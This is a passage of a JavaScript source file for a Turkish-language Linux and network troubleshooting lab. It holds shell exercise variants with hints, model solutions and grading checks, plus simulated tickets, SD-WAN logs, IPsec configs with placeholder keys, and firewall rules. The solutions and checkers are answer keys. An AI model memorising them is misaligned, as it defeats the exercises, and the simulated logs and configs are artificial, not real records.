    hint: "Tek tırnak içinde shell ne variable açar ne de && gibi operatörleri yorumlar, metin olduğu gibi echo'ya gider. Tırnaksız yazarsan && satırı ikiye böler ve ikinci kısım komut olarak çalışır. Çift tırnak && işaretini korur ama $HOME'u açar.",
    solution: "echo 'cd $HOME && ./backup.sh'",
    check: (sh, c) => c.out.trim() === 'cd $HOME && ./backup.sh' },
], { hint: "Tek tırnak içinde shell hiçbir şeyi yorumlamaz, dolar işareti de düz karakter olarak kalır. Çift tırnak ise variable'ları açar ve sen ev dizininin yolunu görürsün. Ekranda ifadenin kendisini görmek istediğinde tek tırnak kullan." });

const VOP_BRANCHES = 'IST-BR-07 Istanbul\nIZM-BR-02 Izmir\nANK-BR-03 Ankara\nAMS-BR-01 Amsterdam\nRTM-BR-02 Rotterdam\nUTR-BR-03 Utrecht\nFRA-BR-05 Frankfurt\n';
const VOP_NGXERR = [
  '2026/10/14 07:01:12 [error] 911#911: *1 connect() failed (111: Connection refused) while connecting to upstream, upstream: "http://127.0.0.1:8080/"',
  '2026/10/14 07:01:40 [warn] 911#911: *4 an upstream response is buffered to a temporary file',
  '2026/10/14 07:02:03 [error] 911#911: *7 upstream timed out (110: Connection timed out) while reading response header from upstream',
  '2026/10/14 07:05:19 [notice] 911#911: signal process started',
  '2026/10/14 07:06:44 [error] 911#911: *12 open() "/var/www/html/favicon.ico" failed (2: No such file or directory)',
  '2026/10/14 07:09:02 [error] 911#911: *15 connect() failed (111: Connection refused) while connecting to upstream',
  '2026/10/14 07:10:30 [warn] 911#911: *18 client sent invalid header line',
].join('\n') + '\n';
addVariants('s3', [
  { title: 'Branch envanteri',
    story: "~/inventory/branches.txt dosyasında her satır bir branch. Rapor başlığına branch sayısını elle yazmak yerine komutun çıktısını metnin içine göm, dosya değişince rapor da kendiliğinden doğru kalsın.",
    task: "echo ile Branch sayisi N yazdır. N değeri wc -l < ~/inventory/branches.txt ile hesaplansın.",
    hint: "Dolar ve parantezle yazılan command substitution içteki komutu çalıştırır ve çıktısını metnin o noktasına yerleştirir. `wc -l` satır sayar, dosyayı küçüktür işaretiyle stdin'den verirsen sadece sayıyı basar, dosya adını yanına eklemez. Hepsini çift tırnak içine al ki tek parça metin olsun.",
    solution: 'echo "Branch sayisi $(wc -l < ~/inventory/branches.txt)"',
    setup: sh => vopPut(sh, VOP_H + '/inventory/branches.txt', VOP_BRANCHES, 0o644, 'burak'),
    check: (sh, c) => { const t = vopText(sh, VOP_H + '/inventory/branches.txt'); const n = (t || '').split('\n').length - 1; return vopRan(c, /\$\(/) && new RegExp('Branch sayisi\\s+' + n + '\\b').test(c.out); } },
  { title: 'Hata sayacı',
    story: "Sabah raporuna nginx error log'undaki error satırı sayısını ekliyorsun. Sayıyı elle yazmak yerine komutun çıktısını cümlenin içine göm. Log ~/logs/nginx-error.log içinde.",
    task: "echo ile Hata sayisi N yazdır. N değeri grep -c error ~/logs/nginx-error.log ile hesaplansın.",
    hint: "Dolar ve parantez içine yazdığın komut önce çalışır, çıktısı metnin içine yapıştırılır, buna command substitution denir. `grep -c` eşleşen satır sayısını tek bir rakam olarak döner, tam da metne gömmek için uygun. Desen küçük harfli error, warn ve notice satırları sayılmaz.",
    solution: 'echo "Hata sayisi $(grep -c error ~/logs/nginx-error.log)"',
    setup: sh => vopPut(sh, VOP_H + '/logs/nginx-error.log', VOP_NGXERR, 0o644, 'burak'),
    check: (sh, c) => { const n = vopCount(vopText(sh, VOP_H + '/logs/nginx-error.log'), /error/); return vopRan(c, /\$\(/) && new RegExp('Hata sayisi\\s+' + n + '\\b').test(c.out); } },
], { hint: "Dolar ve parantez içindeki komut önce çalışır ve çıktısı metnin o noktasına gömülür, buna command substitution denir. `wc -l` dosyayı küçüktür işaretiyle stdin'den okursa sadece sayıyı basar, dosya adını eklemez. Bütün metni çift tırnak içine al ki tek argument olarak echo'ya gitsin." });

addVariants('s4', [
  { title: 'Log kısayolu',
    story: "Gün içinde syslog'un son satırlarına onlarca kez bakıyorsun. Uzun komutu her seferinde yazmak yerine kısa bir alias tanımla.",
    task: "logs adında, tail -n 20 /var/log/syslog çalıştıran bir alias tanımla ve kullan.",
    hint: "`alias` isim ile komutu eşitlik işaretiyle bağlar, komut boşluk içerdiği için tek tırnak şart. Tırnaksız yazarsan alias sadece ilk kelimeyi alır, gerisi ayrı argument olur. Tanımladıktan sonra sadece alias adını yazarak çalıştır, kalıcı olsun istersen .bashrc dosyasına eklenir.",
    solution: "alias logs='tail -n 20 /var/log/syslog'\nlogs",
    check: (sh, c) => (sh.aliases.logs || '').includes('tail') && vopRan(c, /^logs\b/) },
  { title: 'IP kısayolu',
    story: "Jump box'ta interface adreslerine kısa formatta bakmak için `ip -br addr` kullanıyorsun, ama parmakların her seferinde yoruluyor. Kendine myip diye bir alias yap.",
    task: "myip adında, ip -br addr çalıştıran bir alias tanımla ve kullan.",
    hint: "`alias` isim ve komutu eşittir işaretiyle bağlar, eşittirin yanında boşluk olmaz. Komut birden çok kelime olduğu için tek tırnak içine al. `-br` brief demek, her interface tek satırda adı, durumu ve adresiyle görünür.",
    solution: "alias myip='ip -br addr'\nmyip",
    check: (sh, c) => /\bip\b/.test(sh.aliases.myip || '') && vopRan(c, /^myip\b/) },
], { hint: "`alias` bir isimle bir komutu eşitlik işaretiyle bağlar, komut boşluk içerdiği için tek tırnak içine alınmalı. Eşittirin iki yanında boşluk olmaz. Tanımladıktan sonra alias adını yazman yeter, kalıcı olması için .bashrc dosyasına eklenir." });

addVariants('s5', [
  { title: 'Disk takılı mı',
    story: "Backup script'i /mnt/backup altına yazıyor ama USB disk her zaman takılı olmuyor. ls başarısız olursa kullanıcıya anlaşılır bir mesaj ver. || önceki komut fail olduğunda çalışır.",
    task: "ls /mnt/backup çalıştır, fail olursa echo ile backup diski takili degil yazdır. Tek satırda.",
    hint: "Her komut bir exit code ile biter, 0 başarı, sıfırdan farklı fail demek. `||` sadece soldaki komut fail olduğunda sağdakini çalıştırır, `&&` ise tersine başarı halinde. ls olmayan bir dizinde 2 gibi bir exit code döner, mesajın ancak o zaman basılır.",
    solution: 'ls /mnt/backup || echo "backup diski takili degil"',
    setup: sh => vopRm(sh, '/mnt/backup'),
    check: (sh, c) => vopRan(c, /\|\|/) && c.out.includes('backup diski takili degil') },
  { title: 'Önce dizin',
    story: "Rapor script'i yazmadan önce rapor dizininin var olduğundan emin olmak istiyorsun. mkdir başarılı olursa bir onay mesajı bas. && önceki komut başarılıysa çalışır.",
    task: "mkdir -p ~/reports çalıştır, başarılı olursa echo ile rapor dizini hazir yazdır. Tek satırda.",
    hint: "`&&` soldaki komutun exit code'u 0 ise sağdaki komutu çalıştırır, fail durumunda sağ taraf atlanır. `mkdir -p` ara dizinleri de oluşturur ve dizin zaten varsa hata vermez, bu yüzden tekrar çalıştırmak güvenlidir. Son komutun exit code'una `$?` ile bakabilirsin.",
    solution: 'mkdir -p ~/reports && echo "rapor dizini hazir"',
    check: (sh, c) => vopRan(c, /&&/) && c.out.includes('rapor dizini hazir') && vopExists(sh, VOP_H + '/reports', 'd') },
], { hint: "Her komut bir exit code döner, 0 başarı demek. `||` yalnızca soldaki komut fail olursa sağdakini çalıştırır, `&&` ise sadece başarı halinde. cd olmayan bir dizine gidemeyince fail eder ve mesajın o zaman basılır." });

addVariants('s6', [
  { title: 'Log arşivi',
    story: "Her gece nginx access log'unun bir kopyasını ~/archive altına almak istiyorsun. Önce script'i yaz ve elle çalıştır, sonra cron'a bağlarsın.",
    task: "nano ile ~/scripts/archive.sh yaz. Script ~/archive directory'sini oluştursun ve /var/log/nginx/access.log dosyasını oraya kopyalasın. Sonra çalıştır.",
    hint: "Script iki satır, biri `mkdir -p` ile dizini garantiye alır, diğeri `cp` ile dosyayı kopyalar. -p sayesinde dizin zaten varsa script fail etmez, cron'da tekrar tekrar çalışabilir. Execute izni vermediysen `bash` ile dosya yolunu vererek çalıştırabilirsin, ./ ile çalıştırmak için `chmod +x` gerekir.",
    solution: 'nano ~/scripts/archive.sh\nbash ~/scripts/archive.sh',
    editorContent: 'mkdir -p ~/archive\ncp /var/log/nginx/access.log ~/archive/\n',
    check: sh => vopExists(sh, VOP_H + '/scripts/archive.sh', 'f') && vopExists(sh, VOP_H + '/archive/access.log', 'f') },
  { title: 'TAC paketi',
    story: "TAC her case için aynı dosyaları istiyor. Toplama işini bir script'e ver, ilk adım olarak resolv.conf'u case dizinine kopyalasın.",
    task: "nano ile ~/scripts/collect.sh yaz. Script ~/tac/TAC-48213 directory'sini oluştursun ve /etc/resolv.conf dosyasını oraya kopyalasın. Sonra çalıştır.",
    hint: "`mkdir -p` iç içe iki dizini tek seferde açar, tac yoksa onu da oluşturur. Ardından `cp` kaynak dosyayı hedef dizine kopyalar, hedefin sonundaki bölü işareti onun dizin olduğunu netleştirir. Script'i `bash` ile çalıştırmak execute izni istemez.",
    solution: 'nano ~/scripts/collect.sh\nbash ~/scripts/collect.sh',
    editorContent: 'mkdir -p ~/tac/TAC-48213\ncp /etc/resolv.conf ~/tac/TAC-48213/\n',
    check: sh => vopExists(sh, VOP_H + '/scripts/collect.sh', 'f') && vopExists(sh, VOP_H + '/tac/TAC-48213/resolv.conf', 'f') },
], { hint: "Script iki satırdan oluşur, `mkdir -p` dizini garantiye alır, `cp` dosyayı kopyalar. -p sayesinde dizin varsa hata çıkmaz, cron her gece tekrar çalıştırabilir. Execute izni yoksa `bash` ile dosya yolunu vererek çalıştır, ./ ile çalıştırmak için önce `chmod +x` gerekir." });

addVariants('s7', [
  { title: 'Site parametresi',
    story: "Her branch için ayrı script yazmak yerine site kodunu argument olarak alan tek bir script istiyorsun. İlk argument script içinde $1 ile okunur.",
    task: '~/scripts/site.sh adında echo "Site $1 kontrol ediliyor" içeren bir script yaz ve bash ~/scripts/site.sh IST-BR-07 ile çalıştır.',
    hint: "Script'i tek satırla oluşturmak için echo çıktısını büyüktür işaretiyle dosyaya yönlendirebilirsin. Dıştaki tırnak tek tırnak olmalı, yoksa $1 senin shell'inde boş olarak açılır ve dosyaya hiç yazılmaz. Çalıştırırken script adından sonra yazdığın ilk kelime $1 olur.",
    solution: "echo 'echo \"Site $1 kontrol ediliyor\"' > ~/scripts/site.sh\nbash ~/scripts/site.sh IST-BR-07",
    check: (sh, c) => c.out.includes('Site IST-BR-07 kontrol ediliyor') && vopRan(c, /site\.sh/) },
  { title: 'İki argument',
    story: "Tunnel kontrol script'in hem tunnel adını hem de karşı ucu almalı. Birinci argument $1, ikincisi $2 olarak gelir.",
    task: '~/scripts/tunnel.sh adında echo "Tunnel $1 hedef $2" içeren bir script yaz ve bash ~/scripts/tunnel.sh Tunnel11 ams-pe1 ile çalıştır.',
    hint: "echo ile script içeriğini dosyaya yazarken dış tırnak tek tırnak olmalı, böylece $1 ve $2 açılmadan dosyaya geçer. Çalıştırırken argument'lar boşlukla ayrılır, sırası önemlidir. Argument sayısını script içinde `$#` ile kontrol edebilirsin.",
    solution: "echo 'echo \"Tunnel $1 hedef $2\"' > ~/scripts/tunnel.sh\nbash ~/scripts/tunnel.sh Tunnel11 ams-pe1",
    check: (sh, c) => c.out.includes('Tunnel Tunnel11 hedef ams-pe1') && vopRan(c, /tunnel\.sh/) },
], { hint: "Script'i tek satırda oluşturmak için echo çıktısını büyüktür işaretiyle dosyaya yönlendir. Dış tırnak tek tırnak olmalı, yoksa $1 senin shell'inde boş açılır ve dosyaya hiç yazılmaz. Çalıştırırken script adından sonraki ilk kelime $1 olarak gelir." });

/* ======================================================================
   Network dunyasi. ext-net.js tablolarini cagri suresince yamalar, ozel ciktilari uretir
   ====================================================================== */

const VOP_WORLD_FILE = '/var/lib/lab-net/vop-world';

/* iptables -L satiri, ext-net.js'teki bicimle ayni */
function vopIptRow(verbose, pk, by, target, prot, inn, out, src, dst, extra) {
  return (verbose ? `${String(pk).padStart(5)} ${String(by).padStart(5)} ` : '') + `${target.padEnd(10)} ${prot.padEnd(5)} --  ${verbose ? inn.padEnd(6) + ' ' + out.padEnd(7) + ' ' : ''}${src.padEnd(20)} ${dst.padEnd(20)} ${extra || ''}`.replace(/\s+$/, '');
}
function vopSpecHas(s, flags, val) { return new RegExp('(^|\\s)(' + flags + ')\\s+' + val + '(\\s|$)').test(s); }

const VOP_ION = (ts, sev, code, rest) => `${ts} site=IST-BR-07 element=ion-ist-br07 sev=${sev} code=${code} ${rest}`;
const VOP_VL1 = 'vpnlink="ion-ist-br07:INET-1 <-> ams-dc-hub01:INET-1"';
const VOP_VL2 = 'vpnlink="ion-ist-br07:DSL-2 <-> ams-dc-hub01:INET-1"';

const VOP_NETW = {
  A: {
    ticket: 'TAC-48377',
    files: {
      '/home/burak/tickets/TAC-48377.txt': [
        'Case: TAC-48377   Severity: 2   Site: IST-BR-07 (Istanbul branch)',
        'Opened: 2026-10-17 08:20 CEST by branch IT (ozan)',
        'Element: ion-ist-br07 (ION 1200)   Hub: ams-dc-hub01 (ION 3200)   Hub subnet: 10.50.0.0/16',
        '',
        'Symptom',
        '- 06:40 civari INET-1 tamamen koptu, trafik DSL-2 uzerinden devam etti, 07:00 gibi geri geldi',
        '- Jump box ve OT historian files.corp.lab SMB share\'ine (445) baglanamiyor',
        '- OT VLAN\'daki hmi-01 partner\'a (172.31.10.20) SFTP upload yaparken takiliyor',
        '- historian-sync servisi "could not resolve" hatasi veriyor',
        '- files.corp.lab HTTPS acilinca tarayici sertifika uyarisi veriyor',
        '- Yeni dr-site IPsec tunnel\'i kalkmiyor',
        '',
        'Notes',
        '- Dun gece ERP cutover script\'i kosuldu (ozan)',
        '- DR ekibi gecen hafta PSK rotate ettigini soyledi',
        '',
        'Attachments: /var/log/sdwan/TAC-48377-ion-events.log, /var/log/captures/TAC-48377/',
        '',
      ].join('\n'),
      '/var/log/sdwan/TAC-48377-ion-events.log': join([
        VOP_ION('2026-10-17T03:12:44Z', 'MINOR', 'NETWORK_VPNLINK_LATENCY_HIGH', VOP_VL2 + ' info="latency 131 ms above threshold 120 ms"'),
        VOP_ION('2026-10-17T03:13:44Z', 'INFO', 'NETWORK_VPNLINK_LATENCY_HIGH_CLEAR', VOP_VL2),
        VOP_ION('2026-10-17T04:40:02Z', 'MAJOR', 'DEVICEHW_INTERFACE_DOWN', 'interface="1" circuit="INET-1" info="port 1 link down, carrier lost"'),
        VOP_ION('2026-10-17T04:40:03Z', 'CRITICAL', 'NETWORK_DIRECTINTERNET_DOWN', 'circuit="INET-1" info="direct internet unreachable via INET-1"'),
        VOP_ION('2026-10-17T04:40:05Z', 'CRITICAL', 'NETWORK_VPNBFD_DOWN', VOP_VL1 + ' info="BFD session timeout, 3 consecutive misses"'),
        VOP_ION('2026-10-17T04:40:06Z', 'CRITICAL', 'NETWORK_VPNLINK_DOWN', VOP_VL1 + ' info="secure fabric link down"'),
        VOP_ION('2026-10-17T04:40:07Z', 'INFO', 'NETWORK_PATH_SWITCH', 'app=file-transfer from="INET-1 vpn" to="DSL-2 vpn" info="active path unavailable"'),
        VOP_ION('2026-10-17T04:58:31Z', 'INFO', 'DEVICEHW_INTERFACE_UP', 'interface="1" circuit="INET-1" info="port 1 link up, 1000 Mbps full duplex"'),
        VOP_ION('2026-10-17T04:58:40Z', 'INFO', 'NETWORK_VPNBFD_UP', VOP_VL1 + ' info="BFD session established"'),
        VOP_ION('2026-10-17T04:58:41Z', 'INFO', 'NETWORK_VPNLINK_UP', VOP_VL1 + ' info="secure fabric link up, path mtu=1400"'),
        VOP_ION('2026-10-17T04:58:42Z', 'INFO', 'NETWORK_PATH_SWITCH', 'app=file-transfer from="DSL-2 vpn" to="INET-1 vpn" info="preferred path restored"'),
      ]),
      '/etc/ipsec.d/dr-site.conf': [
        '# dr-site, DR ekibinin IPsec gateway\'i. strongSwan include /etc/ipsec.d/*.conf ile yukler', '',
        'conn dr-site', '    keyexchange=ikev2', '    authby=secret', '    left=192.168.1.42', '    leftid=@branch-ist07.example.net', '    leftsubnet=192.168.1.0/24', '    right=203.0.113.30', '    rightid=@dr-gw.example.net', '    rightsubnet=10.90.0.0/16',
        '    ike=aes256gcm16-prfsha256-ecp256!', '    esp=aes256gcm16-ecp256!', '    dpdaction=restart', '    auto=start', '',
      ].join('\n'),
      '/etc/ipsec.d/dr-site.secrets': '# 2025 onboarding PSK\n192.168.1.42 203.0.113.30 : PSK "dr-s1te-2025"\n',
      '/opt/dr-site/onboarding.txt': 'dr-site IPsec onboarding\n========================\nPeer: 203.0.113.30 (dr-gw.example.net, IKEv2 only)\nIKE ve ESP: aes256gcm16-prfsha256-ecp256\nAuth: PSK\n2026-10-10 PSK rotate edildi, yeni anahtar vault\'ta: secret/netops/dr-site\nRemote subnet: 10.90.0.0/16\n',
      '/opt/historian-sync/sync.yaml': '# historian-sync, OT historian verisini files.corp.lab SMB share\'ine aktarir\ntarget: //files.corp.lab/historian\ninterval: 300\n# dns override, eski MPLS saglayicisinin DNS sunucusu, cutover sonrasi silinecekti\ndns_server: 198.51.100.53\ntimeout_ms: 3000\n',
      '/var/log/captures/TAC-48377/README.txt': 'Branch IST-BR-07 capture notlari, TAC-48377\npartner-sftp.pcap     linuxlab eth1, tcpdump -i eth1 host 172.31.10.20, hmi-01 SFTP upload takilirken\nhistorian-dns.pcap    linuxlab eth0, tcpdump -i eth0 port 53\nhistorian-syn.pcap    linuxlab eth1, tcpdump -i eth1 host 10.50.0.20, historian SMB baglanamazken\n',
    },
    rtAdd: '200\tmgmt',
    pcaps: ['TAC-48377/partner-sftp', 'TAC-48377/historian-dns', 'TAC-48377/historian-syn'],
    fw: {
      chain: 'CUTOVER-HOLD', ports: [['10.50.0.20', 445]],
      ipt: (any, num) => [96, 5760, 'DROP', 'tcp', '*', '*', any, '10.50.0.20', num ? 'tcp dpt:445' : 'tcp dpt:microsoft-ds'],
      save: '-A CUTOVER-HOLD -d 10.50.0.20/32 -p tcp -m tcp --dport 445 -j DROP',
      nft: 'ip daddr 10.50.0.20 tcp dport 445 counter packets 96 bytes 5760 drop',
      specOk: s => vopSpecHas(s, '-d|--destination', '10\\.50\\.0\\.20(\\/32)?') && vopSpecHas(s, '-p|--protocol', 'tcp') && vopSpecHas(s, '--dport|--destination-port', '(445|microsoft-ds)') && vopSpecHas(s, '-j|--jump', 'DROP') && !/(-s|--source|-i|-o|--sport)\s/.test(s),
    },
    nat: {
      ipt: any => [4410, '402K', 'MASQUERADE', 'all', '*', '!docker0', '172.17.0.0/16', any],
      save: '-A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE',
      nft: 'ip saddr 172.17.0.0/16 oif != "docker0" masquerade',
    },
    swan: {
      name: 'dr-site',
      conns: ['     dr-site:  192.168.1.42...203.0.113.30  IKEv2, dpddelay=30s', '     dr-site:   local:  [branch-ist07.example.net] uses pre-shared key authentication', '     dr-site:   remote: [dr-gw.example.net] uses pre-shared key authentication', '     dr-site:   child:  192.168.1.0/24 === 10.90.0.0/16 TUNNEL, dpdaction=restart'],
      saHead: 'Security Associations (1 up, 2 connecting):',
      sas: ['     dr-site[14]: CONNECTING, 192.168.1.42[branch-ist07.example.net]...203.0.113.30[dr-gw.example.net]', '     dr-site[14]: IKEv2 SPIs: 51c0ffee12ab34cd_i* 9e8d7c6b5a493827_r', '     dr-site[14]: IKE proposal: AES_GCM_16_256/PRF_HMAC_SHA2_256/ECP_256', '     dr-site[14]: Tasks active: IKE_AUTH IKE_CERT_POST IKE_CONFIG CHILD_CREATE'],
      upFail: "initiating IKE_SA dr-site[15] to 203.0.113.30\ngenerating IKE_SA_INIT request 0 [ SA KE No N(NATD_S_IP) N(NATD_D_IP) N(FRAG_SUP) N(HASH_ALG) N(REDIR_SUP) ]\nsending packet: from 192.168.1.42[500] to 203.0.113.30[500] (464 bytes)\nreceived packet: from 203.0.113.30[500] to 192.168.1.42[500] (248 bytes)\nparsed IKE_SA_INIT response 0 [ SA KE No N(NATD_S_IP) N(NATD_D_IP) N(FRAG_SUP) N(HASH_ALG) ]\nauthentication of 'branch-ist07.example.net' (myself) with pre-shared key\nestablishing CHILD_SA dr-site{15}\ngenerating IKE_AUTH request 1 [ IDi N(INIT_CONTACT) IDr AUTH SA TSi TSr N(MOBIKE_SUP) N(NO_ADD_ADDR) N(MULT_AUTH) N(EAP_ONLY) N(MSG_ID_SYN_SUP) ]\nsending packet: from 192.168.1.42[4500] to 203.0.113.30[4500] (352 bytes)\nreceived packet: from 203.0.113.30[4500] to 192.168.1.42[4500] (80 bytes)\nparsed IKE_AUTH response 1 [ N(AUTH_FAILED) ]\nreceived AUTHENTICATION_FAILED notify error\nestablishing connection 'dr-site' failed",
      swl: ['dr-site: #14, CONNECTING, IKEv2, 51c0ffee12ab34cd_i* 9e8d7c6b5a493827_r', "  local  'branch-ist07.example.net' @ 192.168.1.42[4500]", "  remote 'dr-gw.example.net' @ 203.0.113.30[4500]", '  AES_GCM_16-256/PRF_HMAC_SHA2_256/ECP_256'],
      swL: ['dr-site: IKEv2, no reauthentication, rekeying every 14400s', '  local:  192.168.1.42', '  remote: 203.0.113.30', '  local pre-shared key authentication:', '    id: branch-ist07.example.net', '  remote pre-shared key authentication:', '    id: dr-gw.example.net', '  dr-site: TUNNEL, rekeying every 3600s', '    local:  192.168.1.0/24', '    remote: 10.90.0.0/16'],
    },
    units: {
      strongswan: NET_SWAN_LOG + join([
        "Oct 17 05:59:58 linuxlab charon[1210]: 00[CFG] loaded IKE secret for %any 203.0.113.30",
        "Oct 17 05:59:58 linuxlab charon[1210]: 00[CFG] added configuration 'dr-site'",
        'Oct 17 06:00:04 linuxlab charon[1210]: 07[IKE] initiating IKE_SA dr-site[2] to 203.0.113.30',
        'Oct 17 06:00:04 linuxlab charon[1210]: 07[ENC] generating IKE_SA_INIT request 0 [ SA KE No N(NATD_S_IP) N(NATD_D_IP) N(FRAG_SUP) N(HASH_ALG) N(REDIR_SUP) ]',
        'Oct 17 06:00:04 linuxlab charon[1210]: 08[ENC] parsed IKE_SA_INIT response 0 [ SA KE No N(NATD_S_IP) N(NATD_D_IP) N(FRAG_SUP) N(HASH_ALG) ]',
        'Oct 17 06:00:04 linuxlab charon[1210]: 08[CFG] selected proposal: IKE:AES_GCM_16_256/PRF_HMAC_SHA2_256/ECP_256',
        "Oct 17 06:00:04 linuxlab charon[1210]: 08[IKE] authentication of 'branch-ist07.example.net' (myself) with pre-shared key",
        'Oct 17 06:00:04 linuxlab charon[1210]: 08[ENC] generating IKE_AUTH request 1 [ IDi N(INIT_CONTACT) IDr AUTH SA TSi TSr ]',
        'Oct 17 06:00:04 linuxlab charon[1210]: 09[ENC] parsed IKE_AUTH response 1 [ N(AUTH_FAILED) ]',
        'Oct 17 06:00:04 linuxlab charon[1210]: 09[IKE] received AUTHENTICATION_FAILED notify error',
        'Oct 17 06:00:34 linuxlab charon[1210]: 10[IKE] initiating IKE_SA dr-site[3] to 203.0.113.30',
        'Oct 17 06:00:34 linuxlab charon[1210]: 11[IKE] received AUTHENTICATION_FAILED notify error',
      ]),
      'historian-sync': join([
        'Oct 17 07:30:02 linuxlab historian-sync[1488]: INFO  config /opt/historian-sync/sync.yaml loaded',
        'Oct 17 07:30:02 linuxlab historian-sync[1488]: INFO  dns_server override active, using 198.51.100.53 instead of system resolver',
        'Oct 17 07:30:05 linuxlab historian-sync[1488]: WARN  lookup files.corp.lab @198.51.100.53 timed out (3000 ms), retry 1/3',
        'Oct 17 07:30:08 linuxlab historian-sync[1488]: WARN  lookup files.corp.lab @198.51.100.53 timed out (3000 ms), retry 2/3',
        'Oct 17 07:30:11 linuxlab historian-sync[1488]: WARN  lookup files.corp.lab @198.51.100.53 timed out (3000 ms), retry 3/3',
        'Oct 17 07:30:11 linuxlab historian-sync[1488]: ERROR transfer aborted: could not resolve files.corp.lab',
        'Oct 17 07:35:11 linuxlab historian-sync[1488]: ERROR transfer aborted: could not resolve files.corp.lab',
      ]),
    },
    neigh: ns => { const i = ns.findIndex(n => n.ip === '192.168.2.60'); return ns.slice(0, i + 1).concat([{ ip: '192.168.2.70', dev: 'eth1', mac: null, st: 'FAILED' }], ns.slice(i + 1)); },
    noarp: ['192.168.2.70'],
    dead: ['198.51.100.53'],
    eth: { eth2: { st: { rx_errors: 6120, rx_crc_errors: 6120, rx_align_errors: 214 } } },
    ifs: { eth2: { rx: [90211340, 120330, 6120, 0, 0, 0] } },
    tables: { 200: 'mgmt', mgmt: 'mgmt' },
    routes: { mgmt: [
      { d: '0.0.0.0', l: 0, via: '10.8.0.1', dev: 'wg0', src: '10.8.0.2', t: 'default via 10.8.0.1 dev wg0' },
      { d: '10.8.0.0', l: 24, dev: 'wg0', src: '10.8.0.2', t: '10.8.0.0/24 dev wg0 scope link src 10.8.0.2' },
    ] },
    rules: ['0:\tfrom all lookup local', '100:\tfrom 192.168.100.5 lookup dsl', '200:\tfrom 10.8.0.2 lookup mgmt', '32766:\tfrom all lookup main', '32767:\tfrom all lookup default'],
    ct: ['udp', 17, 25, null, '192.168.1.42', '203.0.113.123', 39012, 123, '203.0.113.123', '192.168.1.42', 123, 39012, '[UNREPLIED]'],
    dmesg: t => t.replace(/(\[ {4}8\.551200\][^\n]*\n)/, '[    8.551190] igb 0000:04:00.0 eth2: Link Speed was downgraded by SmartSpeed\n$1') + '[ 4410.220931] eth2: rx_crc_errors increasing, check cable and link partner\n',
  },
  B: {
    ticket: 'TAC-48544',
    files: {
      '/home/burak/tickets/TAC-48544.txt': [
        'Case: TAC-48544   Severity: 2   Site: IST-BR-07 (Istanbul branch)',
        'Opened: 2026-10-21 07:45 CEST by branch IT (selin)',
        'Element: ion-ist-br07 (ION 1200)   Hub: ams-dc-hub01 (ION 3200)   Hub subnet: 10.50.0.0/16',
        '',
        'Symptom',
        '- 01:55 civari LAN tarafinda core-sw01 ile routing koptu, birkac dakika sonra geldi',
        '- Gece backup job\'lari (bkp-agent) hub\'a ulasamiyor, "could not resolve"',
        '- Monitoring alarm mail\'leri mail.corp.lab\'a gitmiyor',
        '- INET-1 arizasinda DSL-2 uzerinden giden buyuk backup upload\'lari donuyor',
        '- Kullanicilar portal.corp.lab icin sertifika uyarisi aldiklarini soyluyor',
        '- HMI tedarikcisinin ot-vendor bakim tunnel\'i up gorunuyor ama trafik gecmiyor',
        '',
        'Notes',
        '- Gecen hafta egress hardening yapildi (selin)',
        '- Eski branch DC\'si (192.168.1.99) emekliye ayrildi',
        '',
        'Attachments: /var/log/sdwan/TAC-48544-ion-events.log, /var/log/captures/TAC-48544/',
        '',
      ].join('\n'),
      '/var/log/sdwan/TAC-48544-ion-events.log': join([
        VOP_ION('2026-10-20T23:40:10Z', 'CRITICAL', 'NETWORK_VPNBFD_DOWN', VOP_VL1 + ' info="BFD session timeout, 3 consecutive misses"'),
        VOP_ION('2026-10-20T23:40:12Z', 'CRITICAL', 'NETWORK_VPNLINK_DOWN', VOP_VL1 + ' info="secure fabric link down"'),
        VOP_ION('2026-10-20T23:40:13Z', 'INFO', 'NETWORK_PATH_SWITCH', 'app=backup from="INET-1 vpn" to="DSL-2 vpn" info="active path unavailable"'),
        VOP_ION('2026-10-20T23:40:15Z', 'INFO', 'NETWORK_VPNLINK_UP', VOP_VL2 + ' info="secure fabric link up, path mtu=1352"'),
        VOP_ION('2026-10-20T23:55:10Z', 'MAJOR', 'PEERING_BGP_DOWN', 'peer_ip=192.168.1.254 peer_as=65070 peer_name=core-sw01 info="BGP hold timer expired, LAN routes withdrawn"'),
        VOP_ION('2026-10-20T23:58:47Z', 'INFO', 'PEERING_BGP_UP', 'peer_ip=192.168.1.254 peer_as=65070 peer_name=core-sw01 info="BGP session established, 12 prefixes received"'),
        VOP_ION('2026-10-21T00:31:02Z', 'INFO', 'NETWORK_VPNBFD_UP', VOP_VL1 + ' info="BFD session established"'),
        VOP_ION('2026-10-21T00:31:03Z', 'INFO', 'NETWORK_VPNLINK_UP', VOP_VL1 + ' info="secure fabric link up, path mtu=1400"'),
        VOP_ION('2026-10-21T00:31:04Z', 'INFO', 'NETWORK_PATH_SWITCH', 'app=backup from="DSL-2 vpn" to="INET-1 vpn" info="preferred path restored"'),
      ]),
      '/etc/ipsec.d/ot-vendor.conf': [
        '# ot-vendor, HMI tedarikcisinin uzaktan bakim tunnel\'i. strongSwan include /etc/ipsec.d/*.conf ile yukler', '',
        'conn ot-vendor', '    keyexchange=ikev2', '    authby=secret', '    left=192.168.1.42', '    leftid=@branch-ist07.example.net', '    leftsubnet=192.168.2.0/24', '    right=203.0.113.40', '    rightid=@ike.vendor.example', '    rightsubnet=10.80.0.0/16',
        '    ike=aes256gcm16-prfsha256-ecp256!', '    esp=aes256gcm16-ecp256!', '    dpdaction=restart', '    auto=start', '',
      ].join('\n'),
      '/etc/ipsec.d/ot-vendor.secrets': '192.168.1.42 203.0.113.40 : PSK "v3nd0r-0t-2026"\n',
      '/opt/ot-vendor/onboarding.txt': 'ot-vendor uzaktan bakim, IPsec onboarding\n=========================================\nPeer: 203.0.113.40 (ike.vendor.example, IKEv2 only)\nAccepted IKE ve ESP: aes256gcm16-prfsha256-ecp256\nVendor tarafi subnet: 10.80.5.0/24\nBranch tarafi: sadece bakim yapilacak HMI, 192.168.2.50/32\nGenis traffic selector kabul edilmez, /16 ve /24 talepleri reddedilir\n',
      '/opt/bkp-agent/agent.ini': '[repository]\nhost = files.corp.lab\nshare = /backup/ist-br07\n\n[network]\n; eski branch DC uzerindeki DNS, DC emekliye ayrildi ama bu satir kaldi\nnameserver = 192.168.1.99\ntimeout = 3\n',
